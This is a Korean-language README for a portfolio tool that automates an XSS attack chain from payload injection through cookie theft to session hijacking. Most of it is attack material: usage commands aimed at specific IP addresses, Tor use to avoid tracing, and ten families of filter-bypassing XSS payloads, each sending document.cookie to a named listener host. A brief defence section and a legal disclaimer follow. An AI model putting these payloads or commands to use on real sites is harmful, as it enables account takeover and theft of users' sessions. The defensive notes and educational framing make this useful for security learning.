# XSS Cookie Stealer - 자동화 공격 체인

**포트폴리오 목적**: 실전형 XSS 쿠키 탈취 및 세션 하이재킹 시뮬레이션

---

## 📋 프로젝트 개요

이 프로젝트는 **XSS 취약점을 통한 쿠키 탈취부터 세션 하이재킹까지 전체 공격 체인을 자동화**한 보안 테스트 도구입니다.

### 공격 시나리오

```
1. XSS 페이로드 주입 (WAF/필터 우회)
   ↓
2. 피해자의 쿠키 탈취
   ↓
3. 탈취한 쿠키로 세션 하이재킹
   ↓
4. 계정 완전 장악
```

### 주요 기능

- ✅ **30+ XSS 우회 페이로드** - 다양한 인코딩/난독화 기법
- ✅ **Tor 익명화 지원** - IP 추적 방지
- ✅ **자동화된 공격 체인** - 원클릭 실행
- ✅ **실시간 쿠키 수집** - Flask 기반 리스너 서버
- ✅ **세션 하이재킹** - 탈취한 쿠키로 자동 로그인

---

## 🗂️ 파일 구조

```
xss우회/
├── cookie_listener.py          # 쿠키 수신 서버 (Flask)
├── payload_generator.py        # XSS 페이로드 생성기
├── auto_exploit.py             # 자동 공격 스크립트
├── session_hijacker.py         # 세션 하이재킹 도구
├── run_full_attack.sh          # 전체 공격 체인 실행
└── README.md                   # 이 파일
```

---

## 🚀 빠른 시작

### 1. 의존성 설치

```bash
# Python 패키지 설치
pip3 install requests flask PySocks

# Tor 설치 (선택사항, 익명성 유지용)
# macOS
brew install tor

# Ubuntu/Debian
sudo apt install tor

# Tor 시작
tor &
```

### 2. 완전 자동화 실행

```bash
# 실행 권한 부여
chmod +x run_full_attack.sh

# 전체 공격 체인 실행
./run_full_attack.sh
```

프롬프트에 따라 입력:
- **Target URL**: `http://3.34.90.201/add_comment.php`
- **Listener IP**: `3.113.201.239`
- **Method**: `POST`
- **Parameter**: `content`

---

## 🔧 개별 도구 사용법

### 1️⃣ 쿠키 리스너 서버

```bash
# 쿠키 수신 서버 시작 (3.113.201.239에서 실행)
python3 cookie_listener.py

# 서버 정보
# - 포트: 8888
# - 엔드포인트: /steal
# - 로그: stolen_cookies/
```

### 2️⃣ XSS 페이로드 생성

```python
from payload_generator import PayloadGenerator

# 페이로드 생성기
gen = PayloadGenerator("http://3.113.201.239:8888/steal")

# 모든 페이로드 생성
payloads = gen.generate_all()

# 개별 페이로드
basic = gen.basic_cookie_stealer()
encoded = gen.encoding_bypass()
polyglot = gen.polyglot()
```

### 3️⃣ 자동 XSS 공격

```bash
# 기본 실행 (Tor 사용)
python3 auto_exploit.py \
  -t http://3.34.90.201/add_comment.php \
  -l http://3.113.201.239:8888/steal

# Tor 없이 실행
python3 auto_exploit.py \
  -t http://3.34.90.201/add_comment.php \
  -l http://3.113.201.239:8888/steal \
  --no-tor

# GET 메서드 사용
python3 auto_exploit.py \
  -t http://3.34.90.201/search.php \
  -l http://3.113.201.239:8888/steal \
  -m GET -p query

# 지연 시간 조정 (초)
python3 auto_exploit.py \
  -t http://3.34.90.201/add_comment.php \
  -l http://3.113.201.239:8888/steal \
  -d 5
```

### 4️⃣ 세션 하이재킹

```bash
# 최신 쿠키로 세션 하이재킹
python3 session_hijacker.py -t http://3.34.90.201/index.php

# 특정 쿠키 파일 사용
python3 session_hijacker.py \
  -t http://3.34.90.201/profile.php \
  -c cookie_20250101_120000.json

# Tor 사용
python3 session_hijacker.py \
  -t http://3.34.90.201/index.php \
  --tor

# 저장된 쿠키 목록 확인
python3 session_hijacker.py --list
```

---

## 🎯 XSS 우회 기법

### 1. 기본 페이로드

```javascript
<script>fetch('http://3.113.201.239:8888/steal?c='+document.cookie)</script>
```

### 2. 이미지 태그 활용

```html
<img src=x onerror="fetch('http://3.113.201.239:8888/steal?c='+document.cookie)">
```

### 3. 대소문자 혼용 (키워드 필터 우회)

```html
<ScRiPt>fetch('http://3.113.201.239:8888/steal?c='+document.cookie)</sCrIpT>
```

### 4. 주석 분할 (키워드 탐지 우회)

```html
<scr<!--comment-->ipt>fetch('http://3.113.201.239:8888/steal?c='+document.cookie)</scr<!---->ipt>
```

### 5. HTML 엔티티 인코딩

```html
<img src=x onerror="&#102;&#101;&#116;&#99;&#104;('http://3.113.201.239:8888/steal?c='+document.cookie)">
```

### 6. Base64 인코딩

```html
<img src=x onerror="eval(atob('ZmV0Y2goJ2h0dHA6Ly8zLjExMy4yMDEuMjM5Ojg4ODgvc3RlYWw/Yz0nK2RvY3VtZW50LmNvb2tpZSk='))">
```

### 7. 유니코드 이스케이프

```javascript
<script>\u0066\u0065\u0074\u0063\u0068('http://3.113.201.239:8888/steal?c='+document.cookie)</script>
```

### 8. 이벤트 핸들러 변형

```html
<body onload="fetch('http://3.113.201.239:8888/steal?c='+document.cookie)">
<input autofocus onfocus="fetch('http://3.113.201.239:8888/steal?c='+document.cookie)">
<marquee onstart="fetch('http://3.113.201.239:8888/steal?c='+document.cookie)">
<details open ontoggle="fetch('http://3.113.201.239:8888/steal?c='+document.cookie)">
```

### 9. 공백 우회

```html
<img/src=x/onerror=fetch('http://3.113.201.239:8888/steal?c='+document.cookie)>
```

### 10. 폴리글롯 (다중 컨텍스트)

```javascript
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload=fetch('http://3.113.201.239:8888/steal?c='+document.cookie)//">
```

---

## 📊 실행 결과 예시

### 1. 쿠키 탈취 성공

```
🎯 Cookie Stolen!
   Cookie: PHPSESSID=abc123xyz789; user_id=42; session_token=...
   IP: 203.0.113.45
   Saved: stolen_cookies/cookie_20250120_143022.json
```

### 2. 세션 하이재킹 성공

```
✓ Session Hijack Successful!
Found indicators: logout, profile, dashboard
💾 Session info saved to: hijacked_session.json
💾 Page saved to: hijacked_page.html
```

---

## 🛡️ 방어 기법 (보안 담당자용)

### 코드 레벨 방어

```php
// XSS 방어 - 모든 출력에 htmlspecialchars 적용
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');

// 쿠키 보안 설정
session_set_cookie_params([
    'httponly' => true,  // JavaScript 접근 차단
    'secure' => true,    // HTTPS만 허용
    'samesite' => 'Strict'  // CSRF 방지
]);
```

### CSP (Content Security Policy) 적용

```apache
# Apache (.htaccess)
Header set Content-Security-Policy "default-src 'self'; script-src 'self'"

# PHP
header("Content-Security-Policy: default-src 'self'; script-src 'self'");
```

### WAF 규칙 강화

```apache
# ModSecurity 규칙
SecRule ARGS "@rx <script" "id:1000,phase:2,deny,status:403"
SecRule ARGS "@rx javascript:" "id:1001,phase:2,deny,status:403"
SecRule ARGS "@rx onerror=" "id:1002,phase:2,deny,status:403"
```

---

## 🎓 학습 목적

이 도구는 다음을 학습하기 위해 설계되었습니다:

1. **XSS 공격 메커니즘** - 다양한 XSS 유형과 페이로드
2. **WAF/필터 우회 기법** - 인코딩, 난독화, 폴리글롯
3. **쿠키 보안** - HttpOnly, Secure, SameSite 플래그의 중요성
4. **세션 관리** - 안전한 세션 처리 방법
5. **익명화 기법** - Tor를 통한 익명성 유지

---

## ⚠️ 법적 고지

**경고**: 이 도구는 **교육 및 허가된 보안 테스트 목적**으로만 사용해야 합니다.

- ✅ 허용: 자신이 소유한 시스템, 펜테스팅 계약, CTF 대회
- ❌ 금지: 무단 시스템 공격, 악의적 사용

**관련 법률**:
- 정보통신망법 위반 시 최대 5년 이하 징역
- 전자금융거래법 위반 시 최대 10년 이하 징역

**면책 조항**: 본 도구의 무단/악의적 사용으로 인한 법적 책임은 전적으로 사용자에게 있습니다.

---

## 📚 참고 자료

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger XSS Guide](https://portswigger.net/web-security/cross-site-scripting)
- [HackTricks XSS Payloads](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)

---

**프로젝트**: 황준하 포트폴리오
**분야**: 웹 애플리케이션 보안
**날짜**: 2025-11
